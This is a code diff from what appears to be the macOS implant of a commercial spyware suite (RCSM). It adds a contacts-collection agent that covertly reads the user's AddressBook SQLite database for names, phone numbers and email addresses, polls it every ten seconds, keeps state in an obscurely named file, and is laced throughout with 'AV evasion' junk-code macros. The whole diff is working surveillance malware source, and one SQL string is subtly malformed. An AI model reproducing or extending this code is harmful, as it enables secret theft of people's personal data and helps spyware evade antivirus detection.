@@ -8,12 +8,16 @@
  */
 
 #import <AddressBook/AddressBook.h>
+#import <sqlite3.h>
+
 #import "RCSMAgentOrganizer.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
 #import "RCSMAVGarbage.h"
+
+#define AB_PK_FILE @"./389p55"
 
 static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
 
@@ -50,6 +54,9 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
 - (NSData *)_serializeSingleRecordData: (NSData *)aRecordData
                               withType: (int32_t)aType
 {
+  if (aRecordData == nil)
+    return nil;
+  
   u_int elemSize = [aRecordData length];
   NSMutableData *singleElement = [NSMutableData new];
   
@@ -362,6 +369,247 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
   return [contactLog autorelease];
 }
 
+- (void)savePk
+{
+  NSString *tmpZpkString = [NSString stringWithFormat:@"%d", mZ_Pk];
+  [tmpZpkString writeToFile:AB_PK_FILE atomically:YES encoding:NSUTF8StringEncoding error:nil];
+}
+
+- (NSMutableData*)_getPhoneWithId:(NSInteger)theId usingDb:(sqlite3*)db
+{
+  char          sql_query_curr[1024];
+  int           ret, nrow = 0, ncol = 0;
+  char          *szErr;
+  char          **result;
+  char          sql_query_all[] = "select ZFULLNUMBER from ZABCDPHONENUMBER ";
+  
+  NSMutableData *phoneData = nil;
+  
+  sprintf(sql_query_curr, "%s where ZOWNER = %d", sql_query_all, theId);
+  
+  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
+  
+  if (ret != SQLITE_OK)
+    return nil;
+  
+  if (ncol * nrow > 0)
+  {
+    phoneData = [NSMutableData dataWithCapacity:0];
+    
+    for (int i = 0; i< nrow * ncol; i += 1)
+    {
+      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+      
+      if (result[ncol + i] != NULL)
+      {
+        NSString *phone    = [NSString stringWithUTF8String: result[ncol + i]];
+        NSData *dataPhone  = [phone  dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+        
+        NSData *serializedPhoneData = [self _serializeSingleRecordData: dataPhone
+                                                              withType: MobileTelephoneNumber];
+        
+        [phoneData appendData: serializedPhoneData];
+      }
+      
+      [inner release];
+    }
+    
+    sqlite3_free_table(result);
+  }
+  
+  return phoneData;
+}
+
+- (NSData*)_getMailWithId:(NSInteger)theId usingDb:(sqlite3*)db
+{
+  NSMutableData *mailData = nil;
+  
+  char          sql_query_curr[1024];
+  int           ret, nrow = 0, ncol = 0;
+  char          *szErr;
+  char          **result;
+  char          sql_query_all[] = "select ZADDRESSfrom ZABCDMAILADDRESS";
+  
+  sprintf(sql_query_curr, "%s where ZOWNER = %d", sql_query_all, theId);
+
+  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
+  
+  if (ret != SQLITE_OK)
+    return nil;
+  
+  if (ncol * nrow > 0)
+  {
+    mailData = [NSMutableData dataWithCapacity:0];
+    
+    for (int i = 0; i< nrow * ncol; i += 1)
+    {
+      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+      
+      if (result[ncol + i] != NULL)
+      {
+        NSString *mail     = [NSString stringWithUTF8String: result[ncol + i]];
+        NSData *_mailData  = [mail  dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+        
+        NSData *serializedPhoneData = [self _serializeSingleRecordData: _mailData
+                                                              withType: Email1Address];
+        
+        [mailData appendData: serializedPhoneData];
+      }
+      
+      [inner release];
+    }
+    
+    sqlite3_free_table(result);
+  }
+
+  return mailData;
+}
+
+- (const char*)getDBPath
+{
+  NSString *myPath = [NSString stringWithFormat:@"%@/../../Application Support/AddressBook/AddressBook-v22.abcddb",
+                                                [[NSBundle mainBundle]bundlePath]];
+  
+  return [myPath cStringUsingEncoding:NSUTF8StringEncoding];
+}
+
+- (NSData*)createLogHeaderWithSize:(NSInteger)logSize
+{
+  NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(organizerAdditionalHeader)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  additionalHeader->size    = sizeof(organizerAdditionalHeader) + logSize;
+  additionalHeader->version = CONTACT_LOG_VERSION_NEW;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  additionalHeader->identifier  = 0;
+  additionalHeader->program     = 0x01; // phone contact
+  additionalHeader->flags       = 0x00000000; // non local (local = 0x80000000)
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  return [logHeader autorelease];
+}
+
+- (void)_getABcontacts
+{
+  int           z_pk;
+  char          sql_query_curr[1024];
+  int           ret, nrow = 0, ncol = 0;
+  char          *szErr;
+  char          **result;
+  sqlite3       *db;
+  char          sql_query_all[] = "select Z_PK, ZFIRSTNAME, ZLASTNAME from ZABCDRECORD ";
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSMutableData *logData = nil;
+  
+  sprintf(sql_query_curr, "%s where Z_PK > %d", sql_query_all, mZ_Pk);
+  
+  if (sqlite3_open([self getDBPath], &db))
+  {
+    sqlite3_close(db);
+    [pool release];
+    return;
+  }
+  
+  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
+  
+  if (ret != SQLITE_OK)
+  {
+    sqlite3_close(db);
+    [pool release];
+    return;
+  }
+  
+  if (ncol * nrow > 0)
+  {
+    logData = [NSMutableData dataWithCapacity:0];
+    
+    for (int i = 0; i< nrow * ncol; i += 3)
+    {
+      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+      
+      NSString *first = nil;
+      NSString *last  = nil;
+      
+      NSMutableData *contentLog = [NSMutableData dataWithCapacity:0];
+      
+      sscanf(result[ncol + i], "%ld", (long*)&z_pk);
+      
+      if (result[ncol + i + 1] != NULL)
+      {
+        first   = [NSString stringWithUTF8String: result[ncol + i + 1]];
+        NSData *firstData = [first dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+        
+        NSData *serializedFirstData = [self _serializeSingleRecordData: firstData
+                                                              withType: FirstName];
+        
+        if (serializedFirstData != nil)
+          [contentLog appendData: serializedFirstData];
+      }
+      
+      if (result[ncol + i + 2] != NULL)
+      {
+        last = [NSString stringWithUTF8String: result[ncol + i + 2]];
+        
+        NSData *lastData  = [last  dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+        
+        NSData *serializedLastData  = [self _serializeSingleRecordData: lastData
+                                                              withType: LastName];
+        
+        if (serializedLastData != nil)
+          [contentLog appendData: serializedLastData];
+      }     
+      
+      if (first != nil || last != nil)
+      {
+        NSData *serializedPhoneData = [self _getPhoneWithId:z_pk usingDb:db];
+        
+        if (serializedPhoneData != nil)
+          [contentLog appendData: serializedPhoneData];
+        
+        NSData *serializedMailData  = [self _getMailWithId:z_pk usingDb:db];
+
+        if (serializedMailData != nil)
+          [contentLog appendData: serializedMailData];
+        
+        NSData *headerData = [self createLogHeaderWithSize:[contentLog length]];
+        
+        mZ_Pk = z_pk;
+        
+        [logData appendData:headerData];
+        [logData appendData: contentLog];
+      }
+      
+      [inner release];
+    }
+    
+    sqlite3_free_table(result);
+  }
+  
+  sqlite3_close(db);
+  
+  [self _logData: logData];
+  
+  [self savePk];
+  
+  [pool release];
+  
+  return;
+}
+
 - (BOOL)_grabAllContacts
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -370,7 +618,7 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
   AV_GARBAGE_009
   
   NSArray *allPeople;
-  
+
   @try
   {
     allPeople = [[ABAddressBook sharedAddressBook] people];
@@ -413,7 +661,7 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
     
     return NO;
   }
-  
+ 
   // AV evasion: only on release build
   AV_GARBAGE_005
   
@@ -442,19 +690,20 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
     // AV evasion: only on release build
     AV_GARBAGE_003
     
-    u_int blockSize = sizeof(organizerAdditionalHeader)
-    + [contactLog length];
+    u_int blockSize = sizeof(organizerAdditionalHeader) + [contactLog length];
     
     // AV evasion: only on release build
     AV_GARBAGE_005
     
     additionalHeader->size        = blockSize;
-    additionalHeader->version     = CONTACT_LOG_VERSION;
-    
+    additionalHeader->version     = CONTACT_LOG_VERSION_NEW;
+
     // AV evasion: only on release build
     AV_GARBAGE_006
     
     additionalHeader->identifier  = 0;
+    additionalHeader->program     = 0x01; // phone contact
+    additionalHeader->flags       = 0x00000000; // non local (local = 0x80000000)
     
     // AV evasion: only on release build
     AV_GARBAGE_000
@@ -599,6 +848,11 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
   [outerPool release];
 }
 
+- (void)_getABcontactsTimer:(NSTimer*)theTimer
+{
+  [self _getABcontacts];
+}
+
 @end
 
 
@@ -707,9 +961,8 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
 - (void)start
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-  if (gOSMajor == 10 && gOSMinor == 8)
-    return;
+
+  NSTimer *timer = nil;
   
   // AV evasion: only on release build
   AV_GARBAGE_002
@@ -719,42 +972,76 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
   // AV evasion: only on release build
   AV_GARBAGE_000
   
-  //
-  // Register our observer in order to grab notifications about changes
-  // NOTE: kABDatabaseChangedExternallyNotification on NSNotificationCenter
-  // doesn't seem to work
-  //
-  // On Distributed Notification Center
-  // - @"ABDatabaseChangedNotification"
-  // - @"ABDatabaseChangedNotificationPriv" (sent always two times)
-  //
-  [[NSDistributedNotificationCenter defaultCenter] addObserver: self
-                                                      selector: @selector(_ABChangedCallback:)
-                                                          name: @"ABDatabaseChangedNotification"
-                                                        object: nil];
+  if (gOSMajor == 10 && gOSMinor >= 8)
+  {
+    NSString *zpkString = [NSString stringWithContentsOfFile:AB_PK_FILE
+                                                    encoding:NSUTF8StringEncoding
+                                                       error:nil];
+    mZ_Pk = [zpkString integerValue];
+    
+    timer  = [NSTimer scheduledTimerWithTimeInterval:10
+                                              target:self
+                                            selector:@selector(_getABcontactsTimer:)
+                                            userInfo:nil
+                                             repeats:YES];
+
+    [[NSRunLoop currentRunLoop] addTimer: timer forMode: NSRunLoopCommonModes];
+  }
+  else
+  {
+    //
+    // Register our observer in order to grab notifications about changes
+    // NOTE: kABDatabaseChangedExternallyNotification on NSNotificationCenter
+    // doesn't seem to work
+    //
+    // On Distributed Notification Center
+    // - @"ABDatabaseChangedNotification"
+    // - @"ABDatabaseChangedNotificationPriv" (sent always two times)
+    //
+    [[NSDistributedNotificationCenter defaultCenter] addObserver:self
+                                                        selector:@selector(_ABChangedCallback:)
+                                                            name:@"ABDatabaseChangedNotification"
+                                                          object:nil];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
+    // First off, grab all contacts
+    if ([self _grabAllContacts] == NO)
+      [mConfiguration setObject: AGENT_STOP forKey: @"status"];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+  }
   
-  // AV evasion: only on release build
-  AV_GARBAGE_003
-  
-  // First off, grab all contacts
-  if ([self _grabAllContacts] == NO)
-    [mConfiguration setObject: AGENT_STOP forKey: @"status"];
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_005
+  NSRunLoop *currentRunLoop = [NSRunLoop currentRunLoop];
   
   while ([mConfiguration objectForKey: @"status"]    != AGENT_STOP
          && [mConfiguration objectForKey: @"status"] != AGENT_STOPPED)
-    {   
+    {
+      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+      
       // AV evasion: only on release build
       AV_GARBAGE_007
     
-      //[[NSRunLoop currentRunLoop] runUntilDate: sleepInterval];
-      sleep(1);
+      [currentRunLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
+      [inner release];
     }
 
-  // Remove our observer
-  [[NSDistributedNotificationCenter defaultCenter] removeObserver: self];
+  if (gOSMajor == 10 && gOSMinor >= 8)
+  {
+    if (timer != nil)
+      [timer invalidate];
+  }
+  else
+  {
+    // Remove our observer
+    [[NSDistributedNotificationCenter defaultCenter] removeObserver: self];
+  }
   
   if ([mConfiguration objectForKey: @"status"] == AGENT_STOP)
     {   
